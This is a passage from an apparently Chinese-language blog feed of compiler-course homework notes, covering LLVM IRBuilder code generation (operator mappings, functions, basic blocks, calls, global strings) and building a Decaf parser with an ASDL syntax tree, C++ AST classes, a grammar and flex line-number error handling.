class="hljs-comment">// Alloca := rvalue</span><br></code></pre></td></tr></table></figure><h3 id="算术操作"><a href="#算术操作" class="headerlink" title="算术操作"></a>算术操作</h3><table><thead><tr><th>OP</th><th>Function</th></tr></thead><tbody><tr><td><code>+</code></td><td>Builder.CreateAdd</td></tr><tr><td><code>-</code></td><td>Builder.CreateSub</td></tr><tr><td><code>*</code></td><td>Builder.CreateMul</td></tr><tr><td><code>/</code></td><td>Builder.CreateSDiv</td></tr><tr><td><code>&lt;&lt;</code></td><td>Builder.CreateShl</td></tr><tr><td><code>&gt;&gt;</code></td><td>Builder.CreateLShr</td></tr><tr><td><code>%</code></td><td>Builder.CreateSRem</td></tr><tr><td><code>&lt;</code></td><td>Builder.CreateICmpSLT</td></tr><tr><td><code>&gt;</code></td><td>Builder.CreateICmpSGT</td></tr><tr><td><code>&lt;=</code></td><td>Builder.CreateICmpSLE</td></tr><tr><td><code>&gt;=</code></td><td>Builder.CreateICmpSGE</td></tr><tr><td><code>&amp;&amp;</code></td><td>Builder.CreateAnd</td></tr><tr><td>`</td><td></td></tr><tr><td><code>==</code></td><td>Builder.CreateICmpEQ</td></tr><tr><td><code>!=</code></td><td>Builder.CreateICmpNE</td></tr><tr><td></td><td></td></tr><tr><td>-</td><td>Builder.CreateNeg</td></tr><tr><td>!</td><td>Builder.CreateNot</td></tr></tbody></table><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::Type *returnTy;<br><span class="hljs-comment">// assign the correct Type to returnTy</span><br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;llvm::Type *&gt; args;<br><span class="hljs-comment">// fill up the args vector with types</span><br><br>llvm::Function *func = llvm::Function::Create(<br>    llvm::FunctionType::get(returnTy, args, <span class="hljs-literal">false</span>),<br>    llvm::Function::ExternalLinkage,<br>    Name,<br>    TheModule<br>);<br></code></pre></td></tr></table></figure><p>创建 Basic Block</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Create a new basic block which contains a sequence of LLVM instructions</span><br>llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="hljs-string">&quot;entry&quot;</span>, func);<br><span class="hljs-comment">// insert &quot;entry&quot; into symbol table (not used in HW3 but useful in HW4)</span><br><span class="hljs-comment">// All subsequent calls to IRBuilder will place instructions in this location</span><br>Builder.SetInsertPoint(BB);<br></code></pre></td></tr></table></figure><p><code>Builder.SetInsertPoint</code> 很重要，设置 Builder 代码插入位置。</p><p>为参数创建对应的局部变量并添加到符号表，这样就可以用符号的形式访问参数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;Arg : func-&gt;args()) &#123;<br>  llvm::AllocaInst *Alloca = CreateEntryBlockAlloca(func, Arg.getName());<br>  <span class="hljs-comment">// Store the initial value into the alloca.</span><br>  Builder.CreateStore(&amp;Arg, Alloca);<br>  <span class="hljs-comment">// Add to symbol table</span><br>  syms.enter_symtbl(Arg.getName(), Alloca);<br>&#125;<br></code></pre></td></tr></table></figure><p>一些辅助函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::BasicBlock *CurBB = Builder.GetInsertBlock();<br><span class="hljs-comment">// gives you a link to the current basic block</span><br><br>llvm::Function *func = Builder.GetInsertBlock()-&gt;getParent();<br><span class="hljs-comment">// gives you a pointer to the function definition</span><br><br>func-&gt;getReturnType()<br><span class="hljs-comment">// gives you the return type of the function</span><br></code></pre></td></tr></table></figure><p>插入 return 语句</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// sometimes the return statement is deep inside the method</span><br><span class="hljs-comment">// so it is useful to retrieve the function we are in without</span><br><span class="hljs-comment">// passing it down to all the AST nodes below the method declaration</span><br>Builder.CreateRet(llvm::Value*)<br></code></pre></td></tr></table></figure><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::Function *call;<br><span class="hljs-comment">// assign this to the pointer to the function to call, </span><br><span class="hljs-comment">// usually loaded from the symbol table</span><br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;llvm::Value *&gt; args;<br><span class="hljs-comment">// argvals are the values in the method call, </span><br><span class="hljs-comment">// e.g. foo(1) would have a vector of size one with value of 1 with type i32.</span><br><br><span class="hljs-keyword">bool</span> isVoid = call-&gt;getReturnType()-&gt;isVoidTy();<br>llvm::Value *val = Builder.CreateCall(<br>    call,<br>    args,<br>    isVoid ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;calltmp&quot;</span><br>);<br></code></pre></td></tr></table></figure><h3 id="i1-到-i32-转换"><a href="#i1-到-i32-转换" class="headerlink" title="i1 到 i32 转换"></a>i1 到 i32 转换</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::Value *promo = Builder.CreateZExt(*i, Builder.getInt32Ty(), <span class="hljs-string">&quot;zexttmp&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="全局字符串"><a href="#全局字符串" class="headerlink" title="全局字符串"></a>全局字符串</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">llvm::GlobalVariable *GS = Builder.CreateGlobalString(s, <span class="hljs-string">&quot;globalstring&quot;</span>);<br>llvm::Value *stringConst = Builder.CreateConstGEP2_32(GS-&gt;getValueType(), GS, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;cast&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="Static-Single-Assignment-in-LLVM"><a href="#Static-Single-Assignment-in-LLVM" class="headerlink" title="Static Single Assignment in LLVM"></a>Static Single Assignment in LLVM</h3><img src="/2021/01/31/LLVM-Practice/image-20210131191819226.png" class="" title="image-20210131191819226"><p>一般情况下的使用 <code>CreateBr</code> 和 <code>CreateCondBr</code> 的控制流，不需要 Phi 函数， llvm 会自动处理。</p><p>对于逻辑运算符，拥有短路性质，例如 c = fun1() || fun2(), 这种情况需要自己处理 Phi 函数。</p><img src="/2021/01/31/LLVM-Practice/image-20210131192235012.png" class="" title="image-20210131192235012"><img src="/2021/01/31/LLVM-Practice/image-20210131192329669.png" class="" title="image-20210131192329669">]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>homework</tag>
      
      <tag>llvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写decaf语法解析器</title>
    <link href="/2021/01/25/%E7%BC%96%E5%86%99decaf%E8%A7%A3%E6%9E%90%E5%99%A8/"/>
    <url>/2021/01/25/%E7%BC%96%E5%86%99decaf%E8%A7%A3%E6%9E%90%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="编写-Decaf-语法解析器"><a href="#编写-Decaf-语法解析器" class="headerlink" title="编写 Decaf 语法解析器"></a>编写 Decaf 语法解析器</h1><p>Decaf 是 SFU  Compiler 课程要实现的语言，前一篇 Blog 写了如何编写 Decaf 词法分析器, 这一篇 Blog 则是写 Decaf 编译器的第二个阶段，语法解析。语法解析器的作用是解析程序语法，并生成抽象语法树 (Abstract Syntax Tree)，抽象语法树（AST）是程序结构的一种高抽象层次的表达，有了它我们并再不需要源代码的存在了。它可以认为是源代码等价的一种抽象表达。语法解析依赖许多理论基础，前几篇 Blog 我简单地总结了对 LR Parser 的理解（目前，SLR(1), LR(1), LL(1) 均没有总结）。Parser 的理论知识非常抽象，我只理解一些皮毛，但是我已经理解的语法解析知识足够我利用 Yacc 编写语法解析器了。我在编写 Decaf 过程中，遇到的最大的问题有两个:</p><ol><li>Shift / Reduce Conflict</li><li>抽象语法树数据结构设计</li></ol><p>Decaf 语言说明文件: </p><h2 id="ASDL"><a href="#ASDL" class="headerlink" title="ASDL"></a>ASDL</h2><p>Decaf 的抽象语法树定义语言用的是 <a href="http://www.oilshell.org/blog/2016/12/11.html">Zehpyr Abstract Syntax Definition Language</a></p><p>抽象语法定义语言可以定义抽象语法树相关的数据结构。</p><p>Decaf 的抽象语法树定义如下(Decaf.asdl)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs ASDL">-- Decaf abstract syntax tree definition<br><br>-- The specification of the AST nodes is specified using the Zephyr<br>-- Abstract Syntax Definition Language (ASDL) [Wang97]<br><br>-- The abstract syntax tree (AST) is a high-level representation<br>-- of the program structure without the necessity of containing the<br>-- source code; it can be thought of as an abstract representation of<br>-- the source code.<br><br>-- Modifiers on the argument type specify the number of values<br>-- needed; &#39;?&#39; means it is optional, &#39;*&#39; means 0 or more (with commas), <br>-- no modifier means only one value for the argument and it is required.<br><br>-- For * print a singleton for one element, or multiple<br>-- elements seperated by commas, or None for the zero element.<br><br>-- ASDL&#39;s four builtin types are identifier, int, string, object<br><br>module Decaf<br>&#123;<br>    prog &#x3D; Program(extern* extern_list, package body)<br><br>    extern &#x3D; ExternFunction(identifier name, method_type return_type, extern_type* typelist)<br><br>    decaf_type &#x3D; IntType | BoolType<br><br>    method_type &#x3D; VoidType | decaf_type<br><br>    extern_type  &#x3D; VarDef(StringType) | VarDef(decaf_type)<br><br>    package &#x3D; Package(identifier name, field_decl* field_list, method_decl* method_list)<br><br>    field_decl &#x3D; FieldDecl(identifier name, decaf_type type, field_size size)<br>        | AssignGlobalVar(identifier name, decaf_type type, constant value)<br><br>    field_size &#x3D; Scalar | Array(int array_size)<br><br>    method_decl &#x3D; Method(identifier name, method_type return_type, typed_symbol* param_list, method_block block)<br><br>    typed_symbol &#x3D; VarDef(identifier name, decaf_type type)<br><br>    method_block &#x3D; MethodBlock(typed_symbol* var_decl_list, statement* statement_list)<br><br>    block &#x3D; Block(typed_symbol* var_decl_list, statement* statement_list)<br><br>    statement &#x3D; assign<br>        | method_call<br>        | IfStmt(expr condition, block if_block, block? else_block)<br>        | WhileStmt(expr condition, block while_block)<br>        | ForStmt(assign* pre_assign_list, expr condition, assign* loop_assign_list, block for_block)<br>        | ReturnStmt(expr? return_value)<br>        | BreakStmt<br>        | ContinueStmt<br>        | block<br><br>    assign &#x3D; AssignVar(identifier name, expr value)<br>        | AssignArrayLoc(identifier name, expr index, expr value)<br><br>    method_call &#x3D; MethodCall(identifier name, method_arg* method_arg_list)<br><br>    method_arg &#x3D; StringConstant(string value)<br>        | expr<br><br>    expr &#x3D; rvalue<br>        | method_call<br>        | constant<br>        | BinaryExpr(binary_operator op, expr left_value, expr right_value)<br>        | UnaryExpr(unary_operator op, expr value)<br><br>    constant &#x3D; NumberExpr(int value)<br>        | BoolExpr(bool value)<br><br>    rvalue &#x3D; VariableExpr(identifier name)<br>        | ArrayLocExpr(identifier name, expr index)<br><br>    bool &#x3D; True | False<br><br>    binary_operator &#x3D; Plus | Minus | Mult | Div | Leftshift | Rightshift | Mod | Lt | Gt | Leq | Geq | Eq | Neq | And | Or<br><br>    unary_operator &#x3D; UnaryMinus | Not<br>&#125;<br>-- References<br>-- [Wang97] Daniel C. Wang, Andrew W. Appel, Jeff L. Korn, and Chris<br>-- S. Serra. The Zephyr Abstract Syntax Description Language. In<br>-- Proceedings of the Conference on Domain-Specific Languages, pp.<br>-- 213--227, 1997.<br></code></pre></td></tr></table></figure><p>例如 Program 和 ExternFunction 都是 Decaf 抽象语法树中的数据结构，使用 C++ 实现定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Program(extern* extern_list, package body)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProgramAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br>decafStmtList *ExternList;<br>PackageAST *PackageDef;<br><span class="hljs-keyword">public</span>:<br>ProgramAST(decafStmtList *externs, PackageAST *c) : ExternList(externs), PackageDef(c) &#123;&#125;<br>~ProgramAST() &#123; <br><span class="hljs-keyword">if</span> (ExternList != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">delete</span> ExternList; &#125; <br><span class="hljs-keyword">if</span> (PackageDef != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">delete</span> PackageDef; &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;Program&quot;</span>) + <span class="hljs-string">&quot;(&quot;</span> + getString(ExternList) + <span class="hljs-string">&quot;,&quot;</span> + getString(PackageDef) + <span class="hljs-string">&quot;)&quot;</span>; &#125;<br>&#125;;<br><br><br><span class="hljs-comment">// ExternFunction(identifier name, method_type return_type, extern_type* typelist)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExternFunctionAST</span> :</span> <span class="hljs-keyword">public</span> decafAST &#123;<br><span class="hljs-built_in">string</span> Name;<br>TypeAST * ReturnType;<br>VarDefAST * VarList;<br><br><span class="hljs-keyword">public</span>:<br>ExternFunctionAST(<span class="hljs-built_in">string</span> name, TypeAST * returntype, VarDefAST * varlist): Name(name), ReturnType(returntype), VarList(varlist) &#123;&#125;<br>~ExternFunctionAST() &#123;<br><span class="hljs-keyword">if</span>( VarList ) <span class="hljs-keyword">delete</span> VarList;<br><span class="hljs-keyword">if</span>( ReturnType ) <span class="hljs-keyword">delete</span> ReturnType;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">str</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;ExternFunction&quot;</span>)  + <span class="hljs-string">&quot;(&quot;</span> + Name + <span class="hljs-string">&quot;,&quot;</span> + getString(ReturnType) + <span class="hljs-string">&quot;,&quot;</span> + getString(VarList) + <span class="hljs-string">&quot;)&quot;</span>;<br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中 <code>string str()</code> 是 <code>decafAST</code> 基类中定义的用于 AST 序列化的虚函数。</p><p>decaf 程序如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">extern <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">print_int</span><span class="hljs-params">(<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>)</span> <span class="hljs-title">void</span>;</span><br><span class="hljs-keyword">package</span> QuickSort &#123;<br><span class="hljs-keyword">var</span> x <span class="hljs-keyword">int</span>;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> <span class="hljs-title">void</span></span> &#123;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>序列化之后的结果如下</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Program(ExternFunction(print_int,VoidType,VarDef(IntType,IntType)),Package(QuickSort,FieldDecl(x,IntType,Scalar),<span class="hljs-function"><span class="hljs-keyword">Method</span><span class="hljs-params">(main,VoidType,None,MethodBlock(None,None)</span>)))</span><br></code></pre></td></tr></table></figure><h2 id="Decaf-语法定义"><a href="#Decaf-语法定义" class="headerlink" title="Decaf 语法定义"></a>Decaf 语法定义</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">Program</span> = Externs package identifier <span class="hljs-string">&quot;&#123;&quot;</span> FieldDecls MethodDecls <span class="hljs-string">&quot;&#125;&quot;</span> .<br><span class="hljs-attr">Externs</span>    = &#123; ExternDefn &#125; .<br><span class="hljs-attr">ExternDefn</span> = extern func identifier <span class="hljs-string">&quot;(&quot;</span> [ &#123; ExternType &#125;+, ] <span class="hljs-string">&quot;)&quot;</span> MethodType <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">FieldDecls</span> = &#123; FieldDecl &#125; .<br><span class="hljs-attr">FieldDecl</span>  = var &#123; identifier &#125;+, Type <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">FieldDecl</span>  = var &#123; identifier &#125;+, ArrayType <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">FieldDecl</span>  = var identifier Type <span class="hljs-string">&quot;=&quot;</span> Constant <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">MethodDecls</span> = &#123; MethodDecl &#125; .<br><span class="hljs-attr">MethodDecl</span>  = func identifier <span class="hljs-string">&quot;(&quot;</span> [ &#123; identifier Type &#125;+, ] <span class="hljs-string">&quot;)&quot;</span> MethodType Block .<br><span class="hljs-attr">Block</span> = <span class="hljs-string">&quot;&#123;&quot;</span> VarDecls Statements <span class="hljs-string">&quot;&#125;&quot;</span> .<br><span class="hljs-attr">VarDecls</span> = &#123; VarDecl &#125; .<br><span class="hljs-attr">VarDecl</span>  = var &#123; identifier &#125;+, Type <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">Statements</span> = &#123; Statement &#125; .<br><span class="hljs-attr">Statement</span> = Block .<br><span class="hljs-attr">Statement</span> = Assign <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">Assign</span>    = Lvalue <span class="hljs-string">&quot;=&quot;</span> Expr .<br><span class="hljs-attr">Lvalue</span>    = identifier | identifier <span class="hljs-string">&quot;[&quot;</span> Expr <span class="hljs-string">&quot;]&quot;</span> .<br><span class="hljs-attr">Statement</span>  = MethodCall <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">MethodCall</span> = identifier <span class="hljs-string">&quot;(&quot;</span> [ &#123; MethodArg &#125;+, ] <span class="hljs-string">&quot;)&quot;</span> .<br><span class="hljs-attr">MethodArg</span>  = Expr | string_lit .<br><span class="hljs-attr">Statement</span> = if <span class="hljs-string">&quot;(&quot;</span> Expr <span class="hljs-string">&quot;)&quot;</span> Block [ else Block ] .<br><span class="hljs-attr">Statement</span> =  while <span class="hljs-string">&quot;(&quot;</span> Expr <span class="hljs-string">&quot;)&quot;</span> Block .<br><span class="hljs-attr">Statement</span> = for <span class="hljs-string">&quot;(&quot;</span> &#123; Assign &#125;+, <span class="hljs-string">&quot;;&quot;</span> Expr <span class="hljs-string">&quot;;&quot;</span> &#123; Assign &#125;+, <span class="hljs-string">&quot;)&quot;</span> Block .<br><span class="hljs-attr">Statement</span> = return [ <span class="hljs-string">&quot;(&quot;</span> [ Expr ] <span class="hljs-string">&quot;)&quot;</span> ] <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">Statement</span> = break <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">Statement</span> = continue <span class="hljs-string">&quot;;&quot;</span> .<br><span class="hljs-attr">Expr</span> = identifier .<br><span class="hljs-attr">Expr</span> = MethodCall .<br><span class="hljs-attr">Expr</span> = Constant .<br><span class="hljs-attr">UnaryOperator</span> = ( UnaryNot | UnaryMinus ) .<br><span class="hljs-attr">UnaryNot</span> = <span class="hljs-string">&quot;!&quot;</span> .<br><span class="hljs-attr">UnaryMinus</span> = <span class="hljs-string">&quot;-&quot;</span> .<br><span class="hljs-attr">BinaryOperator</span> = ( ArithmeticOperator | BooleanOperator ) .<br><span class="hljs-attr">ArithmeticOperator</span> = ( <span class="hljs-string">&quot;+&quot;</span> | <span class="hljs-string">&quot;-&quot;</span> | <span class="hljs-string">&quot;*&quot;</span> | <span class="hljs-string">&quot;/&quot;</span> | <span class="hljs-string">&quot;&lt;&lt;&quot;</span> | <span class="hljs-string">&quot;&gt;&gt;&quot;</span> | <span class="hljs-string">&quot;%&quot;</span> ) .<br><span class="hljs-attr">BooleanOperator</span> = ( <span class="hljs-string">&quot;==&quot;</span> | <span class="hljs-string">&quot;!=&quot;</span> | <span class="hljs-string">&quot;&lt;&quot;</span> | <span class="hljs-string">&quot;&lt;=&quot;</span> | <span class="hljs-string">&quot;&gt;&quot;</span> | <span class="hljs-string">&quot;&gt;=&quot;</span> | <span class="hljs-string">&quot;&amp;&amp;&quot;</span> | <span class="hljs-string">&quot;||&quot;</span> ) .<br><span class="hljs-attr">Expr</span> = Expr BinaryOperator Expr .<br><span class="hljs-attr">Expr</span> = UnaryOperator Expr .<br><span class="hljs-attr">Expr</span> = <span class="hljs-string">&quot;(&quot;</span> Expr <span class="hljs-string">&quot;)&quot;</span> .<br><span class="hljs-attr">Expr</span> = identifier <span class="hljs-string">&quot;[&quot;</span> Expr <span class="hljs-string">&quot;]&quot;</span> .<br><span class="hljs-attr">ExternType</span> = ( string | Type ) .<br><span class="hljs-attr">Type</span> = ( int | bool ) .<br><span class="hljs-attr">MethodType</span> = ( void | Type ) .<br><span class="hljs-attr">BoolConstant</span> = ( <span class="hljs-literal">true</span> | <span class="hljs-literal">false</span> ) .<br><span class="hljs-attr">ArrayType</span> = <span class="hljs-string">&quot;[&quot;</span> int_lit <span class="hljs-string">&quot;]&quot;</span> Type .<br><span class="hljs-attr">Constant</span> = ( int_lit | char_lit | BoolConstant ) .<br></code></pre></td></tr></table></figure><p>根据 Decaf.asdl 定义实现 decafast.cc</p><p>根据 Decaf 语法定义实现 decafast.y </p><p>两个文件和起来就撸出来一个语法解析器，将 Decaf 源代码转换成语法树。</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>记录下错误处理，flex 不会自动更新 yylineno 变量，解析出错后不能知道确切的行号，解决方法如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp">%&#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> yylineno;<br>%&#125;<br><br><br>%option yylineno<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">yyerror</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *s)</span> </span>&#123;<br>  <span class="hljs-built_in">cerr</span> &lt;&lt; yylineno &lt;&lt; <span class="hljs-string">&quot;:&quot;</span> &lt;&lt; s &lt;&lt; <span class="hljs-built_in">endl</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p><a href="https://github.com/P4nda0s/compilers-class-hw/tree/master/decafast/answer">https://github.com/P4nda0s/compilers-class-hw/tree/master/decafast/answer</a></p><h3 id="lex-代码-decafast-lex"><a href="#lex-代码-decafast-lex" class="headerlink" title="lex 代码: decafast.lex"></a>lex 代码: decafast.lex</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 